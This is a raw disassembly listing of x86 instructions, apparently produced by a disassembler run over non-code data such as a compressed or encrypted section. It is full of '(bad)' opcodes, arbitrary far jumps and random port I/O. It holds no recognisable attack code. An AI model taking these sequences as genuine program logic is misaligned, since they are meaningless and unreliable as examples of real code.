  42223c:	dec    ebx
  42223d:	inc    edi
  42223e:	in     eax,dx
  42223f:	in     eax,0x91
  422241:	ds pop esi
  422243:	enter  0x2b3,0x78
  422247:	into   
  422248:	adc    BYTE PTR [esi-0x3888c2e3],ah
  42224e:	test   al,0x9f
  422250:	mov    esi,0xf7a9a2ff
  422255:	clc    
  422256:	mov    ds:0xb05f2dd4,al
  42225b:	push   es
  42225c:	stos   DWORD PTR es:[edi],eax
  42225d:	sar    DWORD PTR [ecx+0x46],1
  422260:	sbb    bh,bh
  422262:	xchg   edx,eax
  422263:	inc    esi
  422264:	jmp    0xaf0517bb
  422269:	nop
  42226a:	mov    ds:0xacfdc635,al
  42226f:	and    BYTE PTR [edx+0xbd884a],ah
	...
  422281:	add    BYTE PTR [eax-0x1c],cl
  422284:	add    ebx,DWORD PTR [ebx-0x8270051]
  42228a:	pop    esi
  42228b:	sub    BYTE PTR [eax+0x6f613c8f],bl
  422291:	loope  0x4222f0
  422293:	fadd   DWORD PTR [ecx]
  422295:	add    BYTE PTR [edx+0x0],bl
  422298:	add    BYTE PTR [eax],al
  42229a:	mov    dh,0xa8
  42229c:	es and al,0xe0
  42229f:	(bad)  
  4222a0:	inc    edi
  4222a1:	sub    eax,0x9463e29e
  4222a6:	aad    0x7f
  4222a8:	jno    0x42229f
  4222aa:	xor    ah,BYTE PTR [edi-0x2506896e]
  4222b0:	imul   edx,DWORD PTR [ebp+eiz*8-0x21723ff1],0x1a
  4222b8:	cld    
  4222b9:	sar    BYTE PTR [edi+ebp*2-0x1e48825c],cl
  4222c0:	pop    ebx
  4222c1:	jl     0x4222a4
  4222c3:	ins    DWORD PTR es:[edi],dx
  4222c4:	(bad)  
  4222c7:	call   0x5884:0x739d0ac9
  4222ce:	lods   eax,DWORD PTR ds:[esi]
  4222cf:	lods   al,BYTE PTR ds:[esi]
  4222d0:	pop    esi
  4222d1:	das    
  4222d2:	cmp    al,0x2e
  4222d4:	jbe    0x422283
  4222d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222d7:	mov    cs,ecx
  4222d9:	mov    esi,0xdd88fdf1
  4222de:	jecxz  0x422317
  4222e0:	shl    DWORD PTR [eax+ebx*8+0x77],1
  4222e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222e5:	arpl   WORD PTR [edx-0x21],si
  4222e8:	je     0x4222b7
  4222ea:	sbb    ebp,DWORD PTR [edx]
  4222ec:	pop    ebx
  4222ed:	enter  0xb67b,0x29
  4222f1:	bound  edx,QWORD PTR [ecx]
  4222f3:	loope  0x4222f5
	...
  422301:	add    BYTE PTR [edx+0x4],dl
  422304:	mov    ds:0x72a6f682,al
  422309:	aam    0x6d
  42230b:	xor    dh,BYTE PTR [edx]
  42230d:	and    eax,0xed50335e
  422312:	mov    bh,0xd8
  422314:	add    DWORD PTR [eax],eax
  422316:	pop    edx
  422317:	add    BYTE PTR [eax],al
  422319:	add    BYTE PTR [eax+0x37],ah
  42231c:	fs popf 
  42231e:	inc    esp
  42231f:	jo     0x4222b8
  422321:	pop    es
  422322:	sbb    DWORD PTR [edx-0x18],edx
  422325:	(bad)  
  422326:	dec    eax
  422327:	mov    dh,0x66
  422329:	xchg   edx,edi
  42232b:	jno    0x4222fd
  42232d:	pusha  
  42232e:	cmp    eax,0xcbba97ab
  422333:	or     DWORD PTR es:[edi-0xc],edx
  422337:	popf   
  422338:	ror    BYTE PTR [eax-0x382c672f],0x37
  42233f:	ret    
  422340:	pop    ecx
  422341:	retf   
  422342:	mov    BYTE PTR [edi-0x6471b31b],ah
  422348:	rol    BYTE PTR [ebx+0xdfee5e2],0x8b
  42234f:	add    ebp,esp
  422351:	dec    ebp
  422352:	mov    ah,0x94
  422354:	iret   
  422355:	js     0x4222e7
  422357:	jo     0x4223c5
  422359:	cmp    BYTE PTR [eax],bh
  42235b:	icebp  
  42235c:	retf   
  42235d:	icebp  
  42235e:	pop    edx
  42235f:	daa    
  422360:	into   
  422361:	mov    al,0xf5
  422363:	lds    ebp,FWORD PTR [edx]
  422365:	shl    BYTE PTR [edi],cl
  422367:	sbb    BYTE PTR [ebx],bl
  422369:	push   edi
  42236a:	pop    esp
  42236b:	(bad)  
  42236c:	(bad)  
  42236d:	stc    
  42236e:	rcr    BYTE PTR [ebx+eiz*1+0x86855c],0x0
	...
  422382:	cmp    BYTE PTR [edx-0x6a],ch
  422385:	add    edx,esi
  422387:	(bad)  
  422388:	mov    ebp,0xdb4ef67b
  42238d:	out    0x53,eax
  42238f:	push   esp
  422390:	xor    DWORD PTR [ecx+edx*1+0x5a0001d9],esi
  422397:	add    BYTE PTR [eax],al
  422399:	add    BYTE PTR [ecx+eax*2+0x62feed92],cl
  4223a0:	mov    esp,0xdc2bad97
  4223a5:	add    edx,DWORD PTR [ebx]
  4223a7:	imul   esi,edi,0xf4c5439c
  4223ad:	and    ah,BYTE PTR [edx+0x250ef8cc]
  4223b3:	jae    0x422360
  4223b5:	mov    edi,esp
  4223b7:	cmc    
  4223b8:	pop    edx
  4223b9:	add    DWORD PTR [eax+0x3a834db],ebp
  4223bf:	cmp    esi,DWORD PTR [ecx+esi*8]
  4223c2:	mov    ss,esp
  4223c4:	ins    DWORD PTR es:[edi],dx
  4223c5:	add    al,0xf
  4223c7:	xor    al,0x6
  4223c9:	xor    BYTE PTR [edx+0x65],0x3d
  4223cd:	ins    DWORD PTR es:[edi],dx
  4223ce:	shl    DWORD PTR [ecx],0x69
  4223d1:	adc    al,0x6a
  4223d3:	shl    BYTE PTR [eax],0x71
  4223d6:	jno    0x422415
  4223d8:	sub    esi,DWORD PTR [edi-0x9f2dede]
  4223de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223df:	and    BYTE PTR [esi+0x76],bl
  4223e2:	fist   DWORD PTR [ebx]
  4223e4:	retf   0x8857
  4223e7:	or     DWORD PTR [esi+0x3d],0x2ba885b
  4223ee:	pop    es
  4223ef:	lock repnz mov esp,0x6ab7
	...
  422402:	jmp    0x7a729ec0
  422407:	repz jmp 0x422403
  42240a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42240e:	call   0x1d9:0x6babd545
  422415:	add    BYTE PTR [edx+0x0],bl
  422418:	add    BYTE PTR [eax],al
  42241a:	add    al,0x40
  42241c:	add    BYTE PTR [ebx-0x7f],dh
  42241f:	xchg   edi,eax
  422420:	xchg   DWORD PTR [edx],esp
  422422:	xchg   esp,eax
  422423:	cmp    ebx,DWORD PTR [ebp+0x5539334d]
  422429:	in     eax,0x70
  42242b:	aas    
  42242c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242d:	repnz and ch,BYTE PTR [edx-0xa]
  422431:	fcomp  DWORD PTR [edi-0x6d946f14]
  422437:	xchg   ebp,eax
  422438:	mov    esp,0xd66771f1
  42243d:	dec    eax
  42243e:	cmp    BYTE PTR [eax],dl
  422440:	pop    ebp
  422441:	aam    0xa7
  422443:	sub    BYTE PTR [eax],al
  422445:	mov    esi,0x55a9959d
  42244a:	cdq    
  42244b:	pop    ebx
  42244c:	push   edx
  42244d:	xor    BYTE PTR ds:0xc16d5ba6,0x96
  422454:	xlat   BYTE PTR ds:[ebx]
  422455:	xchg   DWORD PTR [edi+0x51444507],edx
  42245b:	xchg   ebp,eax
  42245c:	mov    ebp,0xb2d7b611
  422461:	sbb    eax,0xbbb1bd80
  422466:	dec    eax
  422467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422468:	test   eax,0xc7e5d2ef
  42246d:	enter  0xb837,0x3
  422471:	inc    ecx
  422472:	add    BYTE PTR [edx+0x0],ah
	...
  422481:	add    BYTE PTR [ebx+0x41],bl
  422484:	pop    ebx
  422485:	iret   
  422486:	pop    ebx
  422487:	(bad)  
  422489:	aad    0xf
  42248b:	ss dec esp
  42248d:	dec    esi
  42248e:	add    ebx,DWORD PTR [edx]
  422490:	ja     0x422458
  422492:	(bad)
  422495:	add    BYTE PTR [edx+0x0],bl
  422498:	add    BYTE PTR [eax],al
  42249a:	adc    dl,BYTE PTR [esi]
  42249c:	push   eax
  42249d:	imul   edx,eax,0xffffffd0
  4224a0:	shl    edx,1
  4224a2:	(bad)  
  4224a3:	popf   
  4224a4:	xor    BYTE PTR [edx+esi*1+0x3c4a6fa0],dl
  4224ab:	sti    
  4224ac:	popf   
  4224ad:	repnz mov eax,0x1cc4906c
  4224b3:	(bad)  
  4224b4:	ror    ch,1
  4224b6:	or     BYTE PTR [edi+0x26ec9ed3],cl
  4224bc:	jno    0x4224b7
  4224be:	push   ds
  4224bf:	sbb    al,cl
  4224c1:	xchg   esp,eax
  4224c2:	dec    esp
  4224c3:	sbb    ch,BYTE PTR [ecx-0x4fa1daf5]
  4224c9:	inc    esi
  4224ca:	pop    ebx
  4224cb:	pop    esi
  4224cc:	(bad)  
  4224cd:	leave  
  4224ce:	in     eax,0x61
  4224d0:	sub    al,0xa8
  4224d2:	cmp    al,0x4f
  4224d4:	scas   al,BYTE PTR es:[edi]
  4224d5:	stos   DWORD PTR es:[edi],eax
  4224d6:	sbb    eax,0xa760db88
  4224db:	retf   
  4224dc:	fucomp st(4)
  4224de:	bswap  ebx
  4224e0:	xor    edi,DWORD PTR [ecx-0x3e0d2310]
  4224e6:	or     eax,0xbaae6643
  4224eb:	repz sbb dh,0xff
  4224ef:	and    DWORD PTR [ecx+0x5c],0x73
  4224f3:	ja     0x4224f5
	...
  422501:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422507:	cld    
  422508:	(bad)  [edi-0x65be08a1]
  42250e:	lds    eax,FWORD PTR [edx]
  422510:	in     al,dx
  422511:	push   esi
  422512:	pop    ds
  422513:	fiadd  DWORD PTR [ecx]
  422515:	add    BYTE PTR [edx+0x0],bl
  422518:	add    BYTE PTR [eax],al
  42251a:	(bad)  
  42251b:	out    0xb4,al
  42251d:	nop
  42251e:	out    dx,al
  42251f:	frstor [ebx-0x25]
  422522:	retf   
  422523:	(bad)  [ecx+edi*4+0x3b]
  422527:	dec    esi
  422528:	mov    edx,0x4445ddda
  42252d:	jp     0x422503
  42252f:	fcmovne st,st(6)
  422531:	outs   dx,DWORD PTR ds:[esi]
  422532:	mov    al,0xb5
  422534:	data16 (bad) 
  422536:	add    ecx,0x1a
  422539:	cld    
  42253a:	dec    esp
  42253b:	in     al,dx
  42253c:	inc    ebx
  42253d:	shr    BYTE PTR [ebx],0xda
  422540:	stos   BYTE PTR es:[edi],al
  422541:	cmc    
  422542:	lock pop es
  422544:	add    al,0xbc
  422546:	loope  0x42257a
  422548:	or     ah,al
  42254a:	in     al,dx
  42254b:	stos   BYTE PTR es:[edi],al
  42254c:	jmp    0xd48bdddf
  422551:	xchg   BYTE PTR [esi],bl
  422553:	fs mov dh,0x90
  422556:	pop    ss
  422557:	outs   dx,BYTE PTR ds:[esi]
  422558:	ja     0x422567
  42255a:	inc    ebx
  42255b:	in     al,dx
  42255c:	repz jns 0x4225d0
  42255f:	cmp    eax,0x340258dd
  422564:	rcr    BYTE PTR [ecx],1
  422566:	adc    dl,BYTE PTR [ebx+edx*4-0x36a3a5be]
  42256d:	shr    BYTE PTR [ebp+0x13],1
  422570:	shl    BYTE PTR [eax-0x19],1
  422573:	add    BYTE PTR [eax],0x0
	...
  422582:	outs   dx,BYTE PTR ds:[esi]
  422583:	jae    0x422575
  422585:	retf   0xcbfd
  422588:	jle    0x422581
  42258a:	repz xor eax,0x48268ce9
  422590:	loop   0x4225ed
  422592:	jns    0x42256e
  422594:	add    DWORD PTR [eax],eax
  422596:	pop    edx
  422597:	add    BYTE PTR [eax],al
  422599:	add    BYTE PTR [ebx-0x21],cl
  42259c:	or     DWORD PTR ds:0x9651742,esp
  4225a2:	pop    ecx
  4225a3:	repnz xchg esp,eax
  4225a5:	xchg   esi,ecx
  4225a7:	cmc    
  4225a8:	sub    eax,0xb553bf03
  4225ad:	and    eax,0x54e9051c
  4225b2:	fadd   st(0),st
  4225b4:	cmp    DWORD PTR [edx],edi
  4225b6:	mov    ebp,0xb50f9285
  4225bb:	push   ebx
  4225bc:	inc    edi
  4225bd:	mov    BYTE PTR [esi],0x7c
  4225c0:	fmul   st,st(5)
  4225c2:	cld    
  4225c3:	xchg   edi,eax
  4225c4:	xchg   cx,ax
  4225c6:	pop    esp
  4225c7:	xchg   DWORD PTR [edi+0x5329be4],ebp
  4225cd:	dec    ebp
  4225ce:	call   0x5049569f
  4225d3:	(bad)  
  4225d4:	adc    BYTE PTR [edi],bl
  4225d6:	sub    DWORD PTR [ebx+0x5077d45],0x1f0c0714
  4225e0:	jmp    0xdff76f99
  4225e5:	(bad)  
  4225e6:	lock mov al,0xfd
  4225e9:	rcl    DWORD PTR [edx-0x4c2fd651],cl
  4225ef:	xchg   ebp,eax
  4225f0:	ror    DWORD PTR [ebp+0xe],0x9d
	...
  422600:	add    BYTE PTR [eax],al
  422602:	cmc    
  422603:	adc    al,0xae
  422605:	adc    ebp,edi
  422607:	mov    ebx,0x84e6f6fd
  42260c:	lds    ebp,FWORD PTR [edx-0x1fa66bcd]
  422612:	rcr    edx,cl
  422614:	add    DWORD PTR [eax],eax
  422616:	pop    edx
  422617:	add    BYTE PTR [eax],al
  422619:	add    cl,ch
  42261b:	lds    esp,FWORD PTR [ebx-0x4779a713]
  422621:	int    0x64
  422623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422624:	call   0xc039b75f
  422629:	xor    BYTE PTR [ecx+0x32960713],al
  42262f:	cmp    al,0x83
  422631:	add    al,0x9
  422633:	dec    esi
  422634:	adc    esi,DWORD PTR [edx-0x54abcaf8]
  42263a:	xor    eax,0x2eda307f
  42263f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422640:	call   0xacbc:0xe6dee5b1
  422647:	fild   WORD PTR [edi+ebp*4+0x33f0cda0]
  42264e:	push   DWORD PTR [edx]
  422650:	sti    
  422651:	cdq    
  422652:	dec    esi
  422653:	mov    bl,0x41
  422655:	sub    ch,BYTE PTR [ecx]
  422657:	stos   BYTE PTR es:[edi],al
  422658:	rol    DWORD PTR ds:0x342e8c24,0x81
  42265f:	(bad)  
  422660:	aad    0xbe
  422662:	test   DWORD PTR [ebx],0xeadcf6cc
  422668:	and    DWORD PTR [ecx-0x63],edx
  42266b:	pop    edx
  42266c:	data16 ja 0x42261f
  42266f:	in     eax,0xcd
  422671:	push   ecx
  422673:	js     0x422675
	...
  422681:	add    BYTE PTR [ebx],bh
  422683:	mov    cl,0x57
  422685:	lock fcomip st,st(6)
  422688:	mov    edi,0xbb1c16fb
  42268d:	rcr    bl,0x62
  422690:	dec    esi
  422691:	(bad)  
  422692:	sub    eax,0x5a0001db
  422697:	add    BYTE PTR [eax],al
  422699:	add    BYTE PTR [ebp-0x3f3a20fe],bh
  42269f:	xchg   edi,eax
  4226a0:	ror    DWORD PTR [esi+0x5fa6a86b],cl
  4226a6:	jl     0x4226e9
  4226a8:	mov    ds:0x2ba7487a,al
  4226ad:	test   edi,edx
  4226af:	shr    dh,cl
  4226b1:	push   eax
  4226b2:	pavgw  mm1,QWORD PTR [edi+0x5b017376]
  4226b9:	pop    ss
  4226ba:	pop    esp
  4226bb:	adc    eax,eax
  4226bd:	outs   dx,BYTE PTR ds:[esi]
  4226be:	in     eax,dx
  4226bf:	es cld 
  4226c1:	in     al,dx
  4226c2:	daa    
  4226c3:	out    0x91,eax
  4226c5:	popa   
  4226c6:	jle    0x422742
  4226c8:	fdiv   QWORD PTR [ebp-0x51d5d0a1]
  4226ce:	jo     0x4226ae
  4226d0:	ret    
  4226d1:	dec    esp
  4226d2:	adc    eax,DWORD PTR [ebx-0x6cb3bb5f]
  4226d8:	fild   QWORD PTR [ebp+0x4d]
  4226db:	mov    bl,0x83
  4226dd:	ffree  st(0)
  4226df:	test   al,0x92
  4226e1:	xchg   BYTE PTR [ebx],dl
  4226e3:	xchg   edi,eax
  4226e4:	inc    ebx
  4226e5:	ret    
  4226e6:	jnp    0x42272f
  4226e8:	mov    ch,0xd9
  4226ea:	add    eax,0xdae2c5bf
  4226ef:	std    
  4226f0:	adc    edx,esp
  4226f2:	mov    edx,0x22
	...
  4226ff:	add    BYTE PTR [eax],al
  422701:	add    ah,dl
  422703:	sqrtps xmm6,xmm0
  422706:	(bad)  
  422708:	cmc    
  422709:	das    
  42270a:	sbb    BYTE PTR [eax],cl
  42270c:	xchg   ebx,eax
  42270d:	iret   
  42270e:	mov    edi,es
  422710:	call   0x21dae5b
  422715:	add    BYTE PTR [edx+0x0],bl
  422718:	add    BYTE PTR [eax],al
  42271a:	mov    DWORD PTR ds:0xf0e14d1c,eax
  422720:	xor    edx,DWORD PTR [esi+0x6c]
  422723:	jbe    0x422746
  422725:	lea    edi,[eax+0x7e]
  422728:	pminub mm6,mm5
  42272b:	mov    dl,dh
  42272d:	rcl    DWORD PTR [edx-0x2a],cl
  422730:	retf   
  422731:	or     DWORD PTR [eax+0xcdb6703],edi
  422737:	sub    BYTE PTR [eax],al
  422739:	inc    esp
  42273a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42273b:	retf   0x53ac
  42273e:	add    DWORD PTR [eax],ebp
  422740:	cli    
  422741:	jmp    0x422769
  422743:	neg    DWORD PTR [esi]
  422745:	(bad)  
  422746:	dec    eax
  422747:	mov    eax,ds:0xbae9576b
  42274c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42274d:	out    0xff,al
  42274f:	mov    dh,0xf5
  422751:	sub    dh,0x39
  422754:	outs   dx,BYTE PTR ds:[esi]
  422755:	push   cs
  422756:	sbb    ecx,ebx
  422758:	xchg   ebx,eax
  422759:	push   esp
  42275a:	ja     0x422715
  42275c:	scas   al,BYTE PTR es:[edi]
  42275d:	or     ah,BYTE PTR [eax]
  42275f:	add    al,0x5e
  422761:	bound  ecx,QWORD PTR [esi+0x5d]
  422764:	jecxz  0x422782
  422766:	sbb    al,BYTE PTR [esi+edi*8]
  422769:	jg     0x422755
  42276b:	jae    0x422721
  42276d:	cwde   
  42276e:	lods   al,BYTE PTR ds:[esi]
  42276f:	test   BYTE PTR [edi+0x3b],0xf2
  422773:	xlat   BYTE PTR ds:[ebx]
	...
  422780:	add    BYTE PTR [eax],al
  422782:	int    0x2d
  422784:	xchg   ebp,eax
  422785:	inc    ebx
  422786:	cmc    
  422787:	sti    
  422788:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42278e:	pop    eax
  42278f:	sub    DWORD PTR [edx+0x1dbe1ea],0x0
  422796:	pop    edx
  422797:	add    BYTE PTR [eax],al
  422799:	add    BYTE PTR [eax+0x5a],bl
  42279c:	shl    BYTE PTR [ecx],0x9c
  42279f:	push   eax
  4227a0:	jmp    0x42277c
  4227a2:	pushf  
  4227a3:	add    al,0x45
  4227a5:	sbb    ah,BYTE PTR [esi-0x3b]
  4227a8:	inc    ecx
  4227a9:	sbb    eax,0x3f867456
  4227ae:	sub    DWORD PTR [ebx],0x7f942ebb
  4227b4:	push   edi
  4227b5:	adc    DWORD PTR [ecx+0x574f6be2],esp
  4227bb:	cs es or al,0x94
  4227bf:	fstp   DWORD PTR [edi+0x27]
  4227c2:	mov    edi,0x1479ce15
  4227c7:	xchg   esi,eax
  4227c8:	jns    0x422822
  4227ca:	dec    ecx
  4227cb:	loopne 0x422819
  4227cd:	js     0x422768
  4227cf:	inc    ebp
  4227d0:	dec    BYTE PTR [eax-0x28]
  4227d3:	std    
  4227d4:	jp     0x422780
  4227d6:	mov    esi,0x8976fba1
  4227db:	cmp    al,0x5c
  4227dd:	pop    edi
  4227de:	je     0x4227ce
  4227e0:	test   bh,0xbb
  4227e3:	pop    esi
  4227e4:	jno    0x4227cc
  4227e6:	jl     0x422865
  4227e8:	jnp    0x4227da
  4227ea:	jp     0x422804
  4227ec:	or     DWORD PTR [ebp+0x4c],0x1d
  4227f0:	je     0x422822
  4227f2:	loop   0x4227d2
	...
  422800:	add    BYTE PTR [eax],al
  422802:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422806:	test   DWORD PTR [ebx-0xce58301],0x81b84cfc
  422810:	push   ebx
  422811:	mov    al,0x3b
  422813:	fadd   QWORD PTR [ecx]
  422815:	add    BYTE PTR [edx+0x0],bl
  422818:	add    BYTE PTR [eax],al
  42281a:	or     al,0xce
  42281c:	jle    0x422847
  42281e:	call   0xe66de710
  422823:	shl    DWORD PTR [edi-0x4be752a5],0xb3
  42282a:	jne    0x4227ba
  42282c:	mov    BYTE PTR [esi+0x6e],ah
  42282f:	mov    edx,0x6bef94d9
  422834:	(bad)  
  422835:	les    esp,FWORD PTR [edx*2-0x74b24e2]
  42283c:	cmp    eax,0xe4a789c3
  422841:	dec    edx
  422842:	push   es
  422843:	dec    esi
  422844:	add    esi,DWORD PTR [bx+di+0x26]
  422848:	addr16 cmp al,0x7f
  42284b:	inc    esi
  42284c:	adc    cl,bh
  42284e:	out    dx,eax
  42284f:	sub    ch,BYTE PTR [ecx]
  422851:	ret    0x84e1
  422854:	ret    
  422855:	add    al,0xd7
  422857:	cmp    eax,0xae483b14
  42285c:	loope  0x422865
  42285e:	mov    ?,WORD PTR [edx]
  422860:	ins    DWORD PTR es:[edi],dx
  422861:	mov    eax,ds:0xd190939b
  422866:	mov    ecx,0x98c6a9fa
  42286b:	fwait
  42286c:	repz jle 0x42280d
  42286f:	scas   al,BYTE PTR es:[edi]
  422870:	cmp    eax,0x1ca206
	...
  422881:	add    BYTE PTR [edi],ah
  422883:	push   ecx
  422884:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42288e:	out    dx,al
  42288f:	jno    0x42290d
  422891:	mov    ds:0x1dc95,eax
  422896:	pop    edx
  422897:	add    BYTE PTR [eax],al
  422899:	add    BYTE PTR [edi+0x58d04339],bl
  42289f:	mov    dh,0xb5
  4228a1:	pop    ds
  4228a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228a3:	fcomp  DWORD PTR [edi]
  4228a5:	imul   eax,DWORD PTR [esp+esi*2],0xffffff8a
  4228a9:	imul   ebx,ecx,0xffffff8c
  4228ac:	ins    BYTE PTR es:[edi],dx
  4228ad:	fs adc ch,bl
  4228b0:	adc    BYTE PTR [edi],ah
  4228b2:	sub    al,0x30
  4228b4:	(bad)  
  4228b5:	fwait
  4228b6:	jbe    0x4228fc
  4228b8:	mov    bl,0x6b
  4228ba:	cmp    eax,0xc7c2e287
  4228bf:	xchg   edx,eax
  4228c0:	sub    esi,ecx
  4228c2:	shr    BYTE PTR [esi+ebp*1+0x17],cl
  4228c6:	out    dx,al
  4228c7:	(bad)  
  4228c8:	js     0x4228d3
  4228ca:	pop    esp
  4228cb:	nop
  4228cc:	popa   
  4228cd:	pushf  
  4228ce:	(bad)  
  4228cf:	fmul   QWORD PTR [ecx+0x1d]
  4228d2:	repnz cmp eax,0xc6b4acf0
  4228d8:	or     DWORD PTR [ebp-0xe1e9061],ecx
  4228de:	clc    
  4228df:	inc    edi
  4228e0:	pusha  
  4228e1:	push   esi
  4228e2:	pop    edx
  4228e3:	lds    edx,FWORD PTR [esi+0x55]
  4228e6:	push   ebx
  4228e7:	xor    al,cl
  4228e9:	push   esi
  4228ea:	gs jno 0x4228f9
  4228ed:	pushf  
  4228ee:	sbb    BYTE PTR [esi],ah
  4228f0:	cmp    BYTE PTR fs:[ecx+edi*4+0x0],ah
	...
  422900:	add    BYTE PTR [eax],al
  422902:	add    dl,BYTE PTR ss:[ebp+0xc]
  422906:	jne    0x422967
  422908:	jg     0x422944
  42290a:	clc    
  42290b:	cs aas 
  42290d:	push   0x647e96f0
  422912:	in     eax,dx
  422913:	iret   
  422914:	add    DWORD PTR [eax],eax
  422916:	pop    edx
  422917:	add    BYTE PTR [eax],al
  422919:	add    BYTE PTR [ecx-0x51],bh
  42291c:	jl     0x422987
  42291e:	sub    bl,bl
  422920:	xor    DWORD PTR ds:0x6b23bae4,ebx
  422926:	sub    al,0x1c
  422928:	jg     0x42293d
  42292a:	adc    DWORD PTR [esi],eax
  42292c:	sbb    DWORD PTR [esi],edx
  42292e:	mov    dl,0x84
  422930:	mov    eax,ds:0x8b9b37c4
  422935:	stos   BYTE PTR es:[edi],al
  422936:	mov    BYTE PTR [edx],0x3
  422939:	lods   al,BYTE PTR ds:[esi]
  42293a:	mov    ah,0x2c
  42293c:	xor    al,0xd2
  42293e:	mov    edi,es
  422940:	xchg   esp,eax
  422941:	fdivr  DWORD PTR [ecx-0x6a883da7]
  422947:	call   DWORD PTR [eax+0x2a13c784]
  42294d:	mov    eax,0x2523fd41
  422952:	repnz sub al,0xb8
  422955:	ret    0x5e7a
  422958:	sub    DWORD PTR [ebp-0x25],edi
  42295b:	xchg   edi,eax
  42295c:	push   edi
  42295d:	jge    0x4229c9
  42295f:	int3   
  422960:	jp     0x42292b
  422962:	mov    ds,WORD PTR [ebp+edx*2+0xdfb8ff]
  422969:	and    eax,0xcc73294f
  42296e:	push   cs
  42296f:	cwde   
  422970:	dec    esp
  422971:	repnz pushf 
  422973:	dec    edx
	...
  422980:	add    BYTE PTR [eax],al
  422982:	or     BYTE PTR [ecx-0x404c48e],dh
  422988:	dec    ecx
  422989:	mov    bl,0x94
  42298b:	je     0x422964
  42298d:	call   0xd047:0x619aef4e
  422994:	add    DWORD PTR [eax],eax
  422996:	pop    edx
  422997:	add    BYTE PTR [eax],al
  422999:	add    BYTE PTR [eax],cl
  42299b:	pop    ecx
  42299c:	(bad)  
  42299d:	mov    ecx,0xaeafc3af
  4229a2:	cdq    
  4229a3:	xor    al,0x29
  4229a5:	mov    BYTE PTR [esp+ebp*8-0x61],dl
  4229a9:	(bad)  
  4229aa:	jno    0x4229d7
  4229ac:	push   ebx
  4229ad:	xor    al,0xe8
  4229af:	jo     0x4229f5
  4229b1:	(bad)  
  4229b3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229b5:	rol    BYTE PTR [ecx+edi*1-0x78],0x7e
  4229ba:	sub    eax,0x5f835805
  4229bf:	xchg   ebp,eax
  4229c0:	inc    edi
  4229c1:	sub    dh,0xe4
  4229c4:	fbstp  TBYTE PTR [eax+edx*8]
  4229c7:	or     ebp,ecx
  4229c9:	jne    0x4229a5
  4229cb:	sbb    ebx,DWORD PTR [esi+0x38120ed3]
  4229d1:	push   0x7a843c42
  4229d6:	push   ds
  4229d7:	pop    eax
  4229d8:	gs in  eax,dx
  4229da:	inc    edi
  4229db:	in     eax,dx
  4229dc:	cdq    
  4229dd:	arpl   WORD PTR [edi+0x61],sp
  4229e0:	inc    edx
  4229e1:	xchg   DWORD PTR [ebx+0x4fd5625a],esp
  4229e7:	(bad)  
  4229e8:	pusha  
  4229e9:	pop    esp
  4229ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229eb:	imul   ebx,ebx,0xc60e6592
  4229f1:	mov    esp,0xb3bc
	...
  422a02:	fist   WORD PTR [ebx-0x4e]
  422a05:	dec    edi
  422a06:	mov    esi,0x67d3ffef
  422a0b:	xchg   ecx,edi
  422a0d:	adc    al,0x40
  422a0f:	aaa    
  422a10:	jle    0x4229a6
  422a12:	mov    eax,ds:0x5a0001d0
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [edx],dl
  422a1b:	dec    esi
  422a1c:	mov    cl,0x7c
  422a1e:	jecxz  0x422a6d
  422a20:	push   es
  422a21:	or     DWORD PTR [edx],ebx
  422a23:	mov    edi,0x827b3219
  422a28:	scas   al,BYTE PTR es:[edi]
  422a29:	pop    eax
  422a2a:	test   eax,0xdd0d767b
  422a2f:	mov    al,ds:0x489b28ba
  422a34:	jb     0x422a77
  422a36:	sub    BYTE PTR [ebx+0x64878fa9],bh
  422a3c:	not    eax
  422a3e:	mov    cl,BYTE PTR [edi-0x1c7487a8]
  422a44:	ss out dx,eax
  422a46:	mov    ds:0xf332d14e,al
  422a4b:	mov    cl,0x6f
  422a4d:	pop    ss
  422a4e:	les    ebp,FWORD PTR [esi]
  422a50:	xor    BYTE PTR [edi],ah
  422a52:	idiv   BYTE PTR [edx]
  422a54:	dec    esi
  422a55:	sub    eax,0x62727f58
  422a5a:	sbb    eax,0x504b29a
  422a5f:	mov    ebp,0xa38e88af
  422a64:	in     eax,0xfe
  422a66:	hlt    
  422a67:	daa    
  422a68:	fs inc ebp
  422a6a:	out    dx,eax
  422a6b:	add    eax,0x7109cffe
  422a70:	imul   eax,esi,0x10
  422a73:	rol    BYTE PTR [eax],1
	...
  422a81:	add    BYTE PTR [edi-0x24252cf4],al
  422a87:	fisttp WORD PTR [edi+0x640ccb5d]
  422a8d:	push   ss
  422a8e:	or     al,0xac
  422a90:	sub    edx,ebp
  422a92:	sti    
  422a93:	rol    BYTE PTR [ecx],1
  422a95:	add    BYTE PTR [edx+0x0],bl
  422a98:	add    BYTE PTR [eax],al
  422a9a:	jb     0x422ac6
  422a9c:	cli    
  422a9d:	push   0xffffffd5
  422a9f:	dec    edx
  422aa0:	test   eax,0xe367b9c0
  422aa5:	and    al,0x95
  422aa7:	sub    al,0xaa
  422aa9:	loopne 0x422afb
  422aab:	xor    edx,DWORD PTR [eax+ecx*8+0x5a]
  422aaf:	inc    esi
  422ab0:	std    
  422ab1:	dec    eax
  422ab2:	or     bl,ah
  422ab4:	bound  edx,QWORD PTR [edx-0x5e]
  422ab7:	in     eax,0xe4
  422ab9:	js     0x422b37
  422abb:	pop    ss
  422abc:	xor    ch,BYTE PTR [ebx]
  422abe:	sbb    DWORD PTR fs:[esi+eiz*4+0x43992477],ecx
  422ac6:	xchg   ecx,eax
  422ac7:	push   eax
  422ac8:	test   dl,0x66
  422acb:	push   ebx
  422acc:	adc    DWORD PTR [ebx+0x45f67658],edx
